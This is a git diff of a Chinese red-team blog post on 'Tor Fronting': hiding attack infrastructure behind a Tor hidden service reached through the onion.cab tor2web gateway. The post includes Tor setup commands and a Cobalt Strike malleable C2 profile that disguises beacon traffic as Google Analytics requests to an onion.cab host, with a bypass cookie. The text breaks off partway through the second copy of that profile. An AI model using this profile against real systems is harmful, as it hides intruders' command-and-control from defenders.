@@ -1,4 +1,21 @@
-<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -68,7 +85,7 @@
     back2top_sidebar: false,
     fancybox: true,
     fastclick: true,
-    lazyload: true,
+    lazyload: false,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     algolia: {
@@ -92,29 +109,29 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="隐匿的攻击之-Tor Fronting">
 <meta property="og:url" content="https://evi1cg.github.io/archives/Tor_Fronting.html">
-<meta property="og:site_name" content="Evi1cg's blog">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
 <meta property="og:description" content="文章第一时间发布在www.4hou.com。文章已授权嘶吼独家发布，未经许可禁止转载，如若转载请联系嘶吼编辑   0x01 简介学习完Domain Fronting之后，又从@vysecurity的文章里学会了一个新的姿势–Tor Fronting,使用Tor Fronting同样能在攻击中隐藏自己，并且更加容易实现，此文就来介绍一下这个新的姿势。 0x02 Tor Hidden Service">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/03/2451605837.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/03/1894158464.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/03/3102525272.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/03/4208184059.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/03/379730781.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/03/3590212092.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/03/3907819900.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/03/2490629160.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/03/753479762.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/03/1002553669.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/03/2941190089.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/03/2833825097.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/03/2794740122.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/03/386985194.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/03/2358579381.png">
 <meta property="og:updated_time" content="2019-01-15T05:43:36.770Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="隐匿的攻击之-Tor Fronting">
 <meta name="twitter:description" content="文章第一时间发布在www.4hou.com。文章已授权嘶吼独家发布，未经许可禁止转载，如若转载请联系嘶吼编辑   0x01 简介学习完Domain Fronting之后，又从@vysecurity的文章里学会了一个新的姿势–Tor Fronting,使用Tor Fronting同样能在攻击中隐藏自己，并且更加容易实现，此文就来介绍一下这个新的姿势。 0x02 Tor Hidden Service">
-<meta name="twitter:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta name="twitter:image" content="https://evi1cg.github.io/usr/uploads/2017/03/2451605837.png">
 
 
 
@@ -494,54 +511,54 @@
       
 
       
-        <meta name="generator" content="Hexo 3.9.0"><blockquote>
+        <blockquote>
 <p>文章第一时间发布在<a href="http://www.4hou.com" target="_blank" rel="noopener">www.4hou.com</a>。文章已授权嘶吼独家发布，未经许可禁止转载，如若转载请联系嘶吼编辑</p>
 </blockquote>
 <!-- index-menu -->
 <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>学习完<a href="https://evi1cg.github.io/archives/Domain_Fronting.html">Domain Fronting</a>之后，又从<a href="https://twitter.com/vysecurity" target="_blank" rel="noopener">@vysecurity</a>的文章里学会了一个新的姿势–<code>Tor Fronting</code>,使用Tor Fronting<br>同样能在攻击中隐藏自己，并且更加容易实现，此文就来介绍一下这个新的姿势。</p>
 <h2 id="0x02-Tor-Hidden-Services"><a href="#0x02-Tor-Hidden-Services" class="headerlink" title="0x02 Tor Hidden Services"></a>0x02 Tor Hidden Services</h2><p>Tor是互联网上用于保护您隐私最有力的工具之一，而Tor Hidden Services则是为了隐藏自己的网站或者其他服务的一个服务。通过此服务，我们可以获取到一个通过Tor Browser来访问的Hostname，此Hostname唯一且匿名，所以我们完全可以使用这个Hostname来为我们转发流量从而达到隐匿的目的。</p>
-<p>怎样搭建Tor Hidden Services可以参考此<a href="https://www.torproject.org/docs/tor-hidden-service.html.en" target="_blank" rel="noopener">wiki</a>，下面介绍一下我测试环境的搭建过程。<br>环境为：Ubuntu 12.04<br>搭建过程如下：<br>查看系统信息:<br></p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -<span class="keyword">a</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p></p><div class="progress-images" style="width:848px"><div class="progress-images--placeholder" style="padding-bottom: 28.30188679245283%;"></div><img src="/images/loading.svg" alt="1488422485304.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/03/2451605837.png" data-thumb="/images/thumb/f622455c6622cc6bd90cd0a67d04dbbb.png"></div><p></p>
+<p>怎样搭建Tor Hidden Services可以参考此<a href="https://www.torproject.org/docs/tor-hidden-service.html.en" target="_blank" rel="noopener">wiki</a>，下面介绍一下我测试环境的搭建过程。<br>环境为：Ubuntu 12.04<br>搭建过程如下：<br>查看系统信息:<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -<span class="keyword">a</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/03/2451605837.png" alt="1488422485304.png"></p>
 <p>可以看到Codename为precise，所以在<a href="https://www.torproject.org/docs/debian.html.en#ubuntu" target="_blank" rel="noopener">这里</a>选择deb类型如下：</p>
-<p></p><div class="progress-images" style="width:1526px"><div class="progress-images--placeholder" style="padding-bottom: 44.56094364351245%;"></div><img src="/images/loading.svg" alt="1488422584260.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/03/1894158464.png" data-thumb="/images/thumb/96af3156201085c38a9e2cfa7ae58e0d.png"></div><p></p>
-<p>之后按照官方wiki修改更新源，我的源路径为<code>/etc/apt/sources.list</code>，有的系统更新源路径可能在<code>/etc/apt/sources.list.d/</code>，在源中添加以下条目：<br></p><figure class="highlight avrasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://deb.torproject<span class="meta">.org</span>/torproject<span class="meta">.org</span> precise main</span><br><span class="line">deb-src http://deb.torproject<span class="meta">.org</span>/torproject<span class="meta">.org</span> precise main</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p></p><div class="progress-images" style="width:1546px"><div class="progress-images--placeholder" style="padding-bottom: 34.67011642949547%;"></div><img src="/images/loading.svg" alt="1488422815928.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/03/3102525272.png" data-thumb="/images/thumb/13069899df4de09979f4c0393718817b.png"></div><p></p>
-<p>之后执行以下命令:<br></p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpg --keyserver keys.gnupg.net --recv A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89</span><br><span class="line">gpg --<span class="builtin-name">export</span> A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | sudo apt-key <span class="builtin-name">add</span> -</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>安装：<br></p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="builtin-name">get</span> update</span><br><span class="line">$ sudo apt-<span class="builtin-name">get</span> install tor deb.torproject.org-keyring</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/03/1894158464.png" alt="1488422584260.png"></p>
+<p>之后按照官方wiki修改更新源，我的源路径为<code>/etc/apt/sources.list</code>，有的系统更新源路径可能在<code>/etc/apt/sources.list.d/</code>，在源中添加以下条目：<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://deb.torproject<span class="meta">.org</span>/torproject<span class="meta">.org</span> precise main</span><br><span class="line">deb-src http://deb.torproject<span class="meta">.org</span>/torproject<span class="meta">.org</span> precise main</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/03/3102525272.png" alt="1488422815928.png"></p>
+<p>之后执行以下命令:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpg --keyserver keys.gnupg.net --recv A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89</span><br><span class="line">gpg --<span class="builtin-name">export</span> A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | sudo apt-key <span class="builtin-name">add</span> -</span><br></pre></td></tr></table></figure></p>
+<p>安装：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="builtin-name">get</span> update</span><br><span class="line">$ sudo apt-<span class="builtin-name">get</span> install tor deb.torproject.org-keyring</span><br></pre></td></tr></table></figure></p>
 <p>执行完成以后，就成功安装了，如果出现问题，可以查看一下wiki。</p>
-<p>之后要对tor进行一下配置，编辑配置文件<code>/etc/tor/torrc</code>，将以下两个参数前的注释去掉。<br></p><figure class="highlight crystal"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HiddenServiceDir /var/<span class="class"><span class="keyword">lib</span>/<span class="title">tor</span>/<span class="title">hidden_service</span>/</span></span><br><span class="line">HiddenServicePort <span class="number">80</span> <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>之后要对tor进行一下配置，编辑配置文件<code>/etc/tor/torrc</code>，将以下两个参数前的注释去掉。<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HiddenServiceDir /var/<span class="class"><span class="keyword">lib</span>/<span class="title">tor</span>/<span class="title">hidden_service</span>/</span></span><br><span class="line">HiddenServicePort <span class="number">80</span> <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>HiddenServicePort为代理的端口，将本地的8080端口服务转发到80端口。</p>
 </blockquote>
-<p>配置完成以后对Tor服务进行重启：<br></p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> service </span>tor restart</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>查看获取到的hostname:<br></p><figure class="highlight crystal"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /var/<span class="class"><span class="keyword">lib</span>/<span class="title">tor</span>/<span class="title">hidden_service</span>/<span class="title">hostname</span></span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p></p><div class="progress-images" style="width:1068px"><div class="progress-images--placeholder" style="padding-bottom: 9.176029962546817%;"></div><img src="/images/loading.svg" alt="1488423767248.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/03/4208184059.png" data-thumb="/images/thumb/9f7689fb163f8f7b13295d8d648b1a8b.png"></div><p></p>
-<p>其中<code>xxxxx.onion</code>则为我们的Tor隐藏服务。通过访问这个地址，可以访问到我们服务器8080端口的服务，下面进行一下测试。<br>开启8080端口的服务：<br></p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">☁  ~  cd /tmp</span><br><span class="line">☁  ~  python -m SimpleHTTPServer 8080</span><br><span class="line">Serving HTTP on 0.0.0.0<span class="built_in"> port </span>8080 <span class="built_in">..</span>.</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>配置完成以后对Tor服务进行重启：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> service </span>tor restart</span><br></pre></td></tr></table></figure></p>
+<p>查看获取到的hostname:<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /var/<span class="class"><span class="keyword">lib</span>/<span class="title">tor</span>/<span class="title">hidden_service</span>/<span class="title">hostname</span></span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/03/4208184059.png" alt="1488423767248.png"></p>
+<p>其中<code>xxxxx.onion</code>则为我们的Tor隐藏服务。通过访问这个地址，可以访问到我们服务器8080端口的服务，下面进行一下测试。<br>开启8080端口的服务：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">☁  ~  cd /tmp</span><br><span class="line">☁  ~  python -m SimpleHTTPServer 8080</span><br><span class="line">Serving HTTP on 0.0.0.0<span class="built_in"> port </span>8080 <span class="built_in">..</span>.</span><br></pre></td></tr></table></figure></p>
 <p>使用tor浏览器访问此域名，可看到8080端口的响应：</p>
-<p></p><div class="progress-images" style="width:1372px"><div class="progress-images--placeholder" style="padding-bottom: 49.27113702623907%;"></div><img src="/images/loading.svg" alt="1488424236000.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/03/379730781.png" data-thumb="/images/thumb/a5981da1a9a8ed5d9b54d908ea1108df.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/03/379730781.png" alt="1488424236000.png"></p>
 <h2 id="0x03-Tor2Web"><a href="#0x03-Tor2Web" class="headerlink" title="0x03 Tor2Web"></a>0x03 Tor2Web</h2><p>要对这个隐藏server进行利用，需要借助于一个代理，即<a href="https://www.tor2web.org/" target="_blank" rel="noopener">tor2web</a>，因为要想访问到隐藏服务，直接通过一般浏览器是不行的，所以，可以借助于tor2web，需要做的也很简单，当我们访问形如<code>http://duskgytldkxiuqc6.onion/</code>的链接时，直接修改<code>.onion</code>成<code>.onion.to</code>或<code>.onion.city</code> 或 <code>onion.cab</code> 或者任何一个提供此服务的域名即可。如下图：</p>
-<p></p><div class="progress-images" style="width:1358px"><div class="progress-images--placeholder" style="padding-bottom: 45.80265095729013%;"></div><img src="/images/loading.svg" alt="1488424846717.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/03/3590212092.png" data-thumb="/images/thumb/ec483e5891b0049cbd05ba09f010a5ca.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/03/3590212092.png" alt="1488424846717.png"></p>
 <p>当然，这里会有一个问题，就是访问的时候，会需要我们点击一个按钮才能正常访问，如下图：</p>
-<p></p><div class="progress-images" style="width:1794px"><div class="progress-images--placeholder" style="padding-bottom: 58.75139353400223%;"></div><img src="/images/loading.svg" alt="1488424825504.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/03/3907819900.png" data-thumb="/images/thumb/c90d399f29187789caac7f0bafb2caf3.png"></div><p></p>
-<p>那么怎么样才能直接访问呢，很简单，只需要带上点击以后的cookie就可以了，测试如下：<br></p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -<span class="selector-tag">b</span> <span class="string">'onion_cab_iKnowShit=yourcookie'</span>  <span class="string">'https://xxxx.onion.cab/1.txt'</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p></p><div class="progress-images" style="width:1670px"><div class="progress-images--placeholder" style="padding-bottom: 17.84431137724551%;"></div><img src="/images/loading.svg" alt="1488425162063.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/03/2490629160.png" data-thumb="/images/thumb/fb3c5ad803180cecd0f635d8ff938941.png"></div><p></p>
-<h2 id="0x04-Cobalt-Strike"><a href="#0x04-Cobalt-Strike" class="headerlink" title="0x04 Cobalt Strike"></a>0x04 Cobalt Strike</h2><p>同样的，我们使用Cobalt Strike来进行测试。这里需要配置一个新的profile，@vysecurity已经提供了一个，具体如下：<br>tor-fronting.profile<br></p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># make our C2 look like a Google Web Bug</span></span><br><span class="line"><span class="comment"># https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: @armitagehacker</span></span><br><span class="line"><span class="comment"># Modified by Vincent Yiu @vysecurity for TOR.</span></span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> sleeptime <span class="string">"5000"</span>;</span><br><span class="line"></span><br><span class="line">http-<span class="builtin-name">get</span> {</span><br><span class="line">        <span class="builtin-name">set</span> uri <span class="string">"/___utm"</span>;</span><br><span class="line">       <span class="built_in"> client </span>{</span><br><span class="line">                header <span class="string">"Host"</span> <span class="string">"bjaw6h36vwruhwvb.onion.cab"</span>;</span><br><span class="line">                header <span class="string">"Cookie"</span> <span class="string">"onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d"</span>;</span><br><span class="line"></span><br><span class="line">                metadata {</span><br><span class="line">                        base64url;</span><br><span class="line">                        prepend <span class="string">"__utma"</span>;</span><br><span class="line">                        parameter <span class="string">"utmcc"</span>;</span><br><span class="line">                }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">       <span class="built_in"> server </span>{</span><br><span class="line">                header <span class="string">"Content-Type"</span> <span class="string">"plain/text"</span>;</span><br><span class="line"></span><br><span class="line">                output {</span><br><span class="line">                        # hexdump pixel.gif</span><br><span class="line">                        # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00</span><br><span class="line">                        # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00</span><br><span class="line">                        # 0000020 01 00 01 00 00 02 01 44 00 3b</span><br><span class="line">                        prepend <span class="string">"\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b"</span>;</span><br><span class="line">                        prepend <span class="string">"\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00"</span>;</span><br><span class="line">                        prepend <span class="string">"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00"</span>;</span><br><span class="line"></span><br><span class="line">                        print;</span><br><span class="line">                }</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">http-post {</span><br><span class="line">        <span class="builtin-name">set</span> uri <span class="string">"/__utm"</span>;</span><br><span class="line">        <span class="builtin-name">set</span> verb <span class="string">"GET"</span>;</span><br><span class="line">       <span class="built_in"> client </span>{</span><br><span class="line">                header <span class="string">"Host"</span> <span class="string">"bjaw6h36vwruhwvb.onion.cab"</span>;</span><br><span class="line">                header <span class="string">"Cookie"</span> <span class="string">"onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d"</span>;</span><br><span class="line">                id {</span><br><span class="line">                        prepend <span class="string">"UA-220"</span>;</span><br><span class="line">                        append <span class="string">"-2"</span>;</span><br><span class="line">                        parameter <span class="string">"utmac"</span>;</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                output {</span><br><span class="line">                        base64url;</span><br><span class="line">                        prepend <span class="string">"__utma"</span>;</span><br><span class="line">                        parameter <span class="string">"utmcc"</span>;</span><br><span class="line">                }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">       <span class="built_in"> server </span>{</span><br><span class="line">                header <span class="string">"Content-Type"</span> <span class="string">"plain/text"</span>;</span><br><span class="line"></span><br><span class="line">                output {</span><br><span class="line">                        prepend <span class="string">"\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b"</span>;</span><br><span class="line">                        prepend <span class="string">"\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00"</span>;</span><br><span class="line">                        prepend <span class="string">"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00"</span>;</span><br><span class="line">                        print;</span><br><span class="line">                }</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment"># dress up the staging process too</span></span><br><span class="line">http-stager {</span><br><span class="line">       <span class="built_in"> server </span>{</span><br><span class="line">                header <span class="string">"Content-Type"</span> <span class="string">"plain/text"</span>;</span><br><span class="line">        }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/03/3907819900.png" alt="1488424825504.png"></p>
+<p>那么怎么样才能直接访问呢，很简单，只需要带上点击以后的cookie就可以了，测试如下：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -<span class="selector-tag">b</span> <span class="string">'onion_cab_iKnowShit=yourcookie'</span>  <span class="string">'https://xxxx.onion.cab/1.txt'</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/03/2490629160.png" alt="1488425162063.png"></p>
+<h2 id="0x04-Cobalt-Strike"><a href="#0x04-Cobalt-Strike" class="headerlink" title="0x04 Cobalt Strike"></a>0x04 Cobalt Strike</h2><p>同样的，我们使用Cobalt Strike来进行测试。这里需要配置一个新的profile，@vysecurity已经提供了一个，具体如下：<br>tor-fronting.profile<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># make our C2 look like a Google Web Bug</span></span><br><span class="line"><span class="comment"># https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: @armitagehacker</span></span><br><span class="line"><span class="comment"># Modified by Vincent Yiu @vysecurity for TOR.</span></span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> sleeptime <span class="string">"5000"</span>;</span><br><span class="line"></span><br><span class="line">http-<span class="builtin-name">get</span> &#123;</span><br><span class="line">        <span class="builtin-name">set</span> uri <span class="string">"/___utm"</span>;</span><br><span class="line">       <span class="built_in"> client </span>&#123;</span><br><span class="line">                header <span class="string">"Host"</span> <span class="string">"bjaw6h36vwruhwvb.onion.cab"</span>;</span><br><span class="line">                header <span class="string">"Cookie"</span> <span class="string">"onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d"</span>;</span><br><span class="line"></span><br><span class="line">                metadata &#123;</span><br><span class="line">                        base64url;</span><br><span class="line">                        prepend <span class="string">"__utma"</span>;</span><br><span class="line">                        parameter <span class="string">"utmcc"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       <span class="built_in"> server </span>&#123;</span><br><span class="line">                header <span class="string">"Content-Type"</span> <span class="string">"plain/text"</span>;</span><br><span class="line"></span><br><span class="line">                output &#123;</span><br><span class="line">                        # hexdump pixel.gif</span><br><span class="line">                        # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00</span><br><span class="line">                        # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00</span><br><span class="line">                        # 0000020 01 00 01 00 00 02 01 44 00 3b</span><br><span class="line">                        prepend <span class="string">"\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b"</span>;</span><br><span class="line">                        prepend <span class="string">"\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00"</span>;</span><br><span class="line">                        prepend <span class="string">"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00"</span>;</span><br><span class="line"></span><br><span class="line">                        print;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">        <span class="builtin-name">set</span> uri <span class="string">"/__utm"</span>;</span><br><span class="line">        <span class="builtin-name">set</span> verb <span class="string">"GET"</span>;</span><br><span class="line">       <span class="built_in"> client </span>&#123;</span><br><span class="line">                header <span class="string">"Host"</span> <span class="string">"bjaw6h36vwruhwvb.onion.cab"</span>;</span><br><span class="line">                header <span class="string">"Cookie"</span> <span class="string">"onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d"</span>;</span><br><span class="line">                id &#123;</span><br><span class="line">                        prepend <span class="string">"UA-220"</span>;</span><br><span class="line">                        append <span 